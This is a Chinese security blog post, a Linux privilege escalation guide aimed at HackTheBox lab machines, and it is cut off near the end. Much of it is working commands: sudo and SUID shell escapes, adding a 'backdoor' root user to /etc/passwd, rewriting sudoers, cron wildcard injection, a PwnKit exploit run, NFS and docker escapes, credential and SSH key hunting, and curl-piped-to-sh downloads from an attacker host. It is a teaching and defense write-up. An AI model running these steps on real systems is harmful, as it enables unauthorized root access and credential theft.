---
title: [技术深浅] Linux提权完全指南
url: https://mp.weixin.qq.com/s/fRs_eDIDxPRjNAaC8RTNhA
source: Doonsec's feed
date: 2026-03-26
fetch_date: 2026-03-27T04:27:19.689268
---

# [技术深浅] Linux提权完全指南

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/L7VicJKsiaibFDfiaX8VN8hZW76LbPJwMrwCj0KlIeTEnib7vhAUjmG9IkSdupGCel9Gkg74H328ozem6CySQ16ib7N6KDdhcBWIPt2PiatGib6U2bY/0?wx_fmt=jpeg)

# [技术深浅] Linux提权完全指南

原创

丘驰
丘驰

极客零零七

![]()

在小说阅读器中沉浸阅读

##

> **声明**：本文内容仅用于授权渗透测试和安全研究学习，所有示例均基于 HackTheBox 等合法靶机平台。

### 引言：从 www-data 到 root 的距离

每次打 Linux 靶机，拿到 `www-data` shell 的那一刻既开心又焦虑——开心的是脚踏进去了，焦虑的是还差得远。

Linux 提权路径比 Windows 多，但也更有规律可循。打了几十台 Linux 靶机之后，我发现 **90% 的提权都逃不出这 8 条路径**：sudo 配置错误、SUID 滥用、Cron 计划任务、内核漏洞、密码/凭据泄露、文件权限错误、NFS 配置问题、容器逃逸。

这篇文章把这 8 条路径系统梳理一遍，每条路径都有原理解释、检测命令、实战案例。

### 一、拿到 Shell 之后的第一件事

**永远不要急着提权，先把枚举做完。**

我踩的最大的坑：拿到 shell 立刻开始翻 SUID，找了半天，结果答案是 `sudo -l` 的第一行。

#### 必做的枚举清单

* 1
* 2
* 3
* 4
* 5
* 6
* 7
* 8
* 9
* 10
* 11
* 12
* 13
* 14
* 15
* 16
* 17
* 18

```
# 身份信息id && whoamisudo -l              # ← 这条是重中之重，马上执行
# 系统信息uname -acat /etc/os-releasecat /proc/version
# 网络ss -tlnpcat /etc/hosts
# 敏感文件快速扫cat ~/.bash_historyfind / -name "*.env" 2>/dev/nullgrep -r "password" /var/www/ 2>/dev/null | head -20find / -name "id_rsa" 2>/dev/null
```

#### 自动化工具

* 1
* 2
* 3
* 4
* 5
* 6
* 7
* 8
* 9

```
# LinPEAS（最推荐）curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
# 没有网络时，本机传输python3 -m http.server 8888   # 攻击机curl http://<你的IP>:8888/linpeas.sh | sh  # 目标机
# pspy（监控进程，找隐藏cron）./pspy64 -pf -i 1000
```

### 二、8 条高频提权路径

#### 路径 1：sudo 配置错误（命中率最高）

**执行 `sudo -l` 是 Linux 提权的第一步，没有之一。**

* 1

```
sudo -l
```

任何 `(ALL) NOPASSWD:` 的条目都是提权入口。

**高频可利用的 sudo 配置**：

* 1
* 2
* 3
* 4
* 5
* 6
* 7
* 8
* 9
* 10
* 11
* 12
* 13
* 14
* 15
* 16
* 17
* 18
* 19
* 20
* 21
* 22
* 23
* 24
* 25

```
# vim（直接开 shell）sudo vim -c ':!/bin/bash'
# python3sudo python3 -c 'import os; os.system("/bin/bash")'
# find（常被忽视）sudo find / -exec /bin/bash \; -quit
# less（交互式 shell）sudo less /etc/passwd!/bin/bash        # 在 less 中输入
# awksudo awk 'BEGIN {system("/bin/bash")}'
# nmap（旧版）sudo nmap --interactive!sh
# cp（覆盖 sudoers 给自己提权）echo "$(id -un) ALL=(ALL) NOPASSWD:ALL" | sudo cp /dev/stdin /etc/sudoers
# tar（带通配符时——常见 CTF 场景）sudo tar -xvf archive.tar --checkpoint=1 --checkpoint-action=exec=bash
```

> 查询任意命令的利用方式：GTFOBins[https://gtfobins.github.io/]

**真实案例（HTB Bashed）**：靶机允许 `sudo -u scriptmanager /bin/bash`，切换到 scriptmanager 后发现 `/scripts/` 目录下有 root 执行的脚本，改写脚本直接拿 root。

---

#### 路径 2：SUID / SGID 滥用

* 1
* 2
* 3

```
# 查找所有 SUID 文件find / -perm -u=s -type f 2>/dev/nullfind / -perm -4000 -type f 2>/dev/null
```

**高频可利用的 SUID 二进制**：

| 命令 | 利用方式 |
| --- | --- |
| `find` | `find . -exec /bin/bash -p \; -quit` |
| `vim` | `vim -c ':!/bin/bash'` |
| `python` | `python -c 'import os; os.execl("/bin/bash","sh","-p")'` |
| `bash` | `/bin/bash -p` |
| `cp` | 覆盖 /etc/passwd 或 /etc/sudoers |
| `perl` | `perl -e 'exec "/bin/bash";'` |
| `pkexec` | CVE-2021-4034 (PwnKit)，几乎通杀所有 Linux |

**自定义程序有 SUID**：这是 HTB 高难靶机的常见考点。找到自定义程序后：

1. 用 `strings` / `ltrace` / `strace` 分析行为
2. 检查是否有路径劫持漏洞（用相对路径调用系统命令）
3. 检查是否有库劫持（LD\_PRELOAD 相关）

* 1
* 2
* 3
* 4
* 5

```
# 路径劫持示例：程序内部执行 `cat /etc/passwd` （没有绝对路径）export PATH=/tmp:$PATHecho '/bin/bash' > /tmp/catchmod +x /tmp/cat./vulnerable_suid_binary
```

---

#### 路径 3：Cron 计划任务（第三高频，被严重低估）

**很多人看 crontab 只看 /etc/crontab，但 pspy 会告诉你更多。**

* 1
* 2
* 3
* 4
* 5
* 6
* 7
* 8
* 9

```
# 查看各类 croncrontab -lcat /etc/crontabls -la /etc/cron.*ls -la /var/spool/cron/
# 必跑：pspy 监控实时执行的 root 进程./pspy64# 等待 2-3 分钟，观察以 UID=0 执行的命令
```

**三种常见利用方式**：

**方式一：脚本文件可写**

* 1
* 2
* 3
* 4

```
# root 执行 /opt/backup.sh，脚本可写echo 'chmod +s /bin/bash' >> /opt/backup.sh# 等待 cron 执行后/bin/bash -p
```

**方式二：PATH 劫持（脚本用相对路径）**

* 1
* 2
* 3
* 4

```
# /etc/crontab 中：PATH=/home/user:/usr/local/bin:/usr/bin:/bin# backup.sh 中调用了 `tar`（没有绝对路径）echo 'chmod +s /bin/bash' > /home/user/tarchmod +x /home/user/tar
```

**方式三：通配符注入（tar \* / rsync \* 的经典陷阱）**

* 1
* 2
* 3
* 4
* 5
* 6
* 7
* 8

```
# root cron 执行：tar -czf /backup.tgz /home/user/*# 利用：在 /home/user/ 下创建特殊文件名echo 'chmod +s /bin/bash' > /home/user/run.shchmod +x /home/user/run.shtouch '/home/user/--checkpoint=1'touch '/home/user/--checkpoint-action=exec=sh run.sh'# 等待 cron 执行，bash 变成 SUID/bin/bash -p
```

---

#### 路径 4：内核漏洞（精准打击）

* 1
* 2
* 3
* 4
* 5
* 6

```
# 确认内核版本uname -r
# 自动检测可利用的内核漏洞./linux-exploit-suggester.shpython3 linux-exploit-suggester-2.py
```

**当前最高价值内核漏洞**：

| 漏洞名称 | CVE | 影响范围 | 备注 |
| --- | --- | --- | --- |
| **PwnKit** | CVE-2021-4034 | 几乎所有 Linux | pkexec SUID，通杀 |
| **DirtyPipe** | CVE-2022-0847 | 内核 5.8-5.16.11 | 写任意只读文件 |
| **DirtyCow** | CVE-2016-5195 | 内核 < 4.8.3 | 老靶机常见 |
| **Looney Tunables** | CVE-2023-4911 | glibc 2.34-2.38 | 比较新 |
| **Baron Samedit** | CVE-2021-3156 | Sudo < 1.9.5p2 | Sudo 缓冲区溢出 |

**PwnKit 的通杀性**：CVE-2021-4034 影响 2009 年以来几乎所有 Linux 发行版，利用 pkexec 的 SUID 写入，利用代码公开且易用。

* 1
* 2
* 3

```
# PwnKit 利用git clone https://github.com/berdav/CVE-2021-4034cd CVE-2021-4034 && make && ./cve-2021-4034
```

---

#### 路径 5：密码与凭据搜索

* 1
* 2
* 3
* 4
* 5
* 6
* 7
* 8
* 9
* 10
* 11
* 12
* 13
* 14
* 15
* 16
* 17
* 18

```
# 历史命令（高命中率）cat ~/.bash_historycat ~/.zsh_history
# Web 应用配置文件（数据库密码）find /var/www -name "*.php" -exec grep -l "password\|passwd\|db_pass" {} \;cat /var/www/html/config.phpfind / -name "wp-config.php" 2>/dev/null
# .env 文件find / -name ".env" 2>/dev/null
# SSH 私钥find / -name "id_rsa" 2>/dev/nullfind / -name "*.pem" 2>/dev/null
# 全局密码搜索grep -r "password" /home/ /opt/ /var/ 2>/dev/null | grep -v ".pyc\|Binary" | head -30
```

**一个反复奏效的经验**：找到数据库密码后，**一定要尝试这个密码 SSH 登录其他用户**。现实中密码重用无处不在，HTB 靶机也有意模拟这一点。

---

#### 路径 6：文件权限漏洞

* 1
* 2
* 3
* 4
* 5
* 6
* 7
* 8
* 9
* 10
* 11
* 12

```
# /etc/passwd 全局可写（最危险）ls -la /etc/passwd# 如果可写，追加新 root 用户：openssl passwd -1 hacked    # 生成密码哈希echo 'backdoor:$1$<hash>:0:0:root:/root:/bin/bash' >> /etc/passwdsu backdoor
# /etc/sudoers 可写echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
# 查找全局可写的关键文件find / -writable -type f 2>/dev/null | grep -E "cron|sudoers|passwd|shadow|hosts"
```

---

#### 路径 7：NFS 错误配置

* 1
* 2
* 3
* 4
* 5
* 6

```
# 检测 NFScat /etc/exportsshowmount -e <target>
# 关键：no_root_squash 配置# 如果某个共享目录有 no_root_squash，攻击机的 root 挂载后同样是 root
```

**利用方式**（攻击机执行）：

* 1
* 2
* 3
* 4
* 5
* 6
* 7

```
mkdir /tmp/nfs_mountmount -o rw,vers=3 <target>:/shared /tmp/nfs_mount# 创建 SUID bashcp /bin/bash /tmp/nfs_mount/bash_suidchmod +s /tmp/nfs_mount/bash_suid# 目标机执行/path/to/bash_suid -p
```

---

#### 路径 8：Docker / LXC 逃逸

* 1
* 2
* 3
* 4
* 5
* 6

```
# 检测是否在容器内cat /proc/1/cgroup | grep dockerls -la /.dockerenv
# 检测当前用户是否在 docker 组id | grep docker
```

**docker 组成员 = root 权限**：

* 1
* 2

```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh# 直接拿宿主机 root shell
```

### 三、提权决策流程图

* 1
* 2
* 3
* 4
* 5
* 6
* 7
* 8
* 9
* 10
* 11
* 12
* 13
* 14
* 15
* 16
* 17

```
拿到 Linux Shell    ↓sudo -l ── 有 NOPASSWD 条目? ──→ GTFOBins 查利用 → root    ↓ NOSUID 扫描 ── 有可利用的二进制? ──→ GTFOBins / 逆向分析 → root    ↓ NOLinPEAS 全扫描 ── 看高亮输出    ↓bash_history / 配置文件 ── 有密码? ──→ su / SSH 切换 → 提权    ↓ NOcrontab + pspy ── 有 root 脚本可写? ──→ 修改脚本 → root    ↓ NO文件权限 ── /etc/passwd 可写? ──→ 追加 root 用户 → root    ↓ NO内核版本 ── PwnKit / DirtyPipe? ──→ CVE 利用 → root    ↓ NONFS / docker 组 ──→ 逃逸
```

### 四、Shell 升级（必做）

很多人忽略这一步，结果 Ctrl+C 直接断了。

* 1
* 2
* 3
* 4
* 5
* 6
* 7
* 8
* 9
* 10

```
# 方法1：Python（最通用）python3 -c 'import pty; pty.spawn("/bin/bash")'
# 方法2：完整交互式 TTY（推荐，可以用 Ctrl+C、方向键、Tab）python3 -c 'import pty; pty.spawn("/bin/bash")'# 然后 Ctrl+Z 挂起stty raw -echo; fg     # 攻击机执行# 回到目标 shell 后export TERM=xtermstty rows 40 columns 150
```

### 五、蓝队防御建议

| 攻击路径 | 防御措施 |
| --- | --- |
| sudo 滥用 | 最小化 sudo 权限；避免 NOPASSWD；定期审计 /etc/sudoers |
| SUID 滥用 | 仅保留必要的 SUID 二进制；定期扫描变化 |
| Cron 脚本可写 | 严格控制 cron 脚本文件权限；使用绝对路径 |
| 内核漏洞 | 及时更新内核；使用 SELinux/AppArmor |
| 凭据泄露 | 配置文件不存明文密码；审计历史命令记录 |
| /etc/passwd 可写 | 检查 DAC；关键文件使用不可变属性（chattr +i） |
| NFS no\_root\_squash | 审计 /etc/exports；用 root\_squash 替代 |
| docker 组 | 不随意将用户加入 docker 组；使用 rootless docker |

---

### 关键收获

1. **`sudo -l` 是 Linux 提权的第一关**：任何 NOPASSWD 条目都是提权入口，不管是 vim 还是 tar，查 GTFOBins 必有解法。
2. **pspy 是隐藏 Cron 的克星**：很多 root cron...